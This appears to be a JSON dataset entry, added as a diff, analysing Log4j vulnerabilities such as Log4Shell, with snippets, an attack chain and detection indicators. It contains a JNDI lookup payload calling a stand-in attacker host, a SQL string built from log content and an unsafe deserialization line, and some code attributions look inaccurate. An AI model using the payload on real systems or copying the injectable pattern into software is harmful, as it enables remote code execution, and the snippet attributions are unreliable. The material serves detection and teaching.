@@ -1,0 +1,128 @@
+{
+  "package_info": {
+    "package_name": "Log4j",
+    "package_manager": "Maven Central Repository",
+    "package_versions": "Multiple (see CVEs: 2021-44228, 2021-44832, 2022-23302, 2022-23305)",
+    "why_malicious": "Log4j contained multiple critical vulnerabilities, most notably CVE-2021-44228 (Log4Shell), which allowed attackers to execute arbitrary code remotely by injecting specially crafted data into log messages. These vulnerabilities were easy to exploit, affected a wide range of applications, and enabled attackers to gain unauthorized access, exfiltrate data, or escalate privileges, making the affected versions highly dangerous."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime",
+        "file_location": "org/apache/logging/log4j/core/lookup/JndiLookup.java",
+        "required_permissions": [
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "${jndi:ldap://attacker.com/a}",
+      "code_language": "java",
+      "code_behavior": "At runtime, the code processes log messages containing JNDI lookup patterns, initiates outbound network requests to attacker-controlled LDAP servers, and loads remote code or retrieves data, resulting in potential remote code execution.",
+      "malice_analysis": {
+        "why_suspicious": "Processing untrusted input in log messages to perform JNDI lookups enables attackers to trigger network requests and load remote code, which is a critical security risk.",
+        "violated_expectations": "Logging frameworks are expected to record messages without executing code or initiating network requests based on log content.",
+        "similar_legitimate_use": "JNDI lookups are legitimate for internal resource discovery in trusted environments, but should never be exposed to untrusted input.",
+        "key_indicators": [
+          "Presence of ${jndi:...} patterns in log messages",
+          "Outbound LDAP/RMI network requests triggered by log processing",
+          "Dynamic code loading or class instantiation from external sources"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime",
+        "file_location": "org/apache/logging/log4j/core/appender/db/jdbc/JdbcAppender.java",
+        "required_permissions": [
+          "database",
+          "network"
+        ]
+      },
+      "code_snippet": "String sql = \"INSERT INTO logs (message) VALUES ('\" + logEvent.getMessage().getFormattedMessage() + \"')\";\nstatement.executeUpdate(sql);",
+      "code_language": "java",
+      "code_behavior": "At runtime, the code constructs SQL queries by directly embedding untrusted log message content into SQL statements, allowing attackers to inject arbitrary SQL and potentially exfiltrate or modify database records.",
+      "malice_analysis": {
+        "why_suspicious": "Directly including unsanitized user-controlled log data in SQL queries creates a classic SQL injection vulnerability, enabling attackers to manipulate or access sensitive database information.",
+        "violated_expectations": "Logging frameworks should use parameterized queries and never allow log data to alter the structure or logic of database queries.",
+        "similar_legitimate_use": "Parameterized queries are legitimate for dynamic logging, provided all inputs are properly sanitized and validated.",
+        "key_indicators": [
+          "Dynamic SQL construction using log message content",
+          "Absence of input sanitization or parameterization",
+          "Potential for SQL injection via log input"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime",
+        "file_location": "org/apache/logging/log4j/core/appender/mom/jms/JmsAppender.java",
+        "required_permissions": [
+          "network",
+          "messaging"
+        ]
+      },
+      "code_snippet": "Object obj = objectMessage.getObject(); // Deserializes data from JMS broker",
+      "code_language": "java",
+      "code_behavior": "At runtime, the code deserializes objects received from a JMS broker, which can be attacker-controlled, allowing arbitrary code execution through unsafe deserialization of untrusted data.",
+      "malice_analysis": {
+        "why_suspicious": "Deserializing untrusted data from external sources is a well-known vector for remote code execution, as attackers can supply malicious serialized objects.",
+        "violated_expectations": "Logging appenders should not deserialize data from untrusted or unauthenticated sources, as this exposes the application to code execution risks.",
+        "similar_legitimate_use": "Deserialization is legitimate when receiving data from trusted, authenticated internal message brokers with strict input validation.",
+        "key_indicators": [
+          "Deserialization of objects from external JMS brokers",
+          "No validation or restriction on incoming serialized data",
+          "Potential for remote code execution via crafted serialized payloads"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker sends a specially crafted log message containing a JNDI lookup pattern or SQL injection payload to the vulnerable application.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Triggering remote code execution via JNDI or compromising the database through SQL injection."
+    },
+    {
+      "step": 2,
+      "action": "Log4j processes the malicious log message, performing the JNDI lookup or executing the unsanitized SQL statement.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Establishing outbound connections to attacker-controlled servers or executing malicious SQL, resulting in code execution or data exfiltration."
+    },
+    {
+      "step": 3,
+      "action": "If the JMSSink Appender is enabled, the attacker sends a malicious serialized object to the JMS broker, which Log4j deserializes.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Arbitrary code execution on the application server via unsafe deserialization."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Log message processing triggers outbound LDAP, RMI, or JMS network requests",
+      "Presence of ${jndi:...} patterns in log data or configuration",
+      "SQL queries constructed with unsanitized log message content",
+      "Deserialization of objects from untrusted or external JMS brokers"
+    ],
+    "file_indicators": [
+      "log4j2.xml or log4j.properties files with JNDI lookup patterns enabled",
+      "JDBC Appender configurations using dynamic SQL templates without parameterization",
+      "JMSSink or JmsAppender enabled in Log4j configuration files"
+    ],
+    "network_indicators": [
+      "Outbound LDAP, RMI, or JMS connections to external or untrusted servers",
+      "Unexpected connections to domains or IPs not present in normal application operation, especially those controlled by attackers"
+    ],
+    "how_to_detect": "Monitor application logs and network traffic for unexpected outbound LDAP, RMI, or JMS connections, especially those initiated during log processing. Audit Log4j configuration files for the presence of JNDI lookups, unsanitized JDBC Appender SQL templates, or enabled JMSSink/JmsAppender. Use static code analysis to detect dynamic SQL construction from log input and deserialization of untrusted data. Implement runtime monitoring for the use of JNDI patterns in log messages and alert on any network activity to suspicious external servers."
+  }
+}
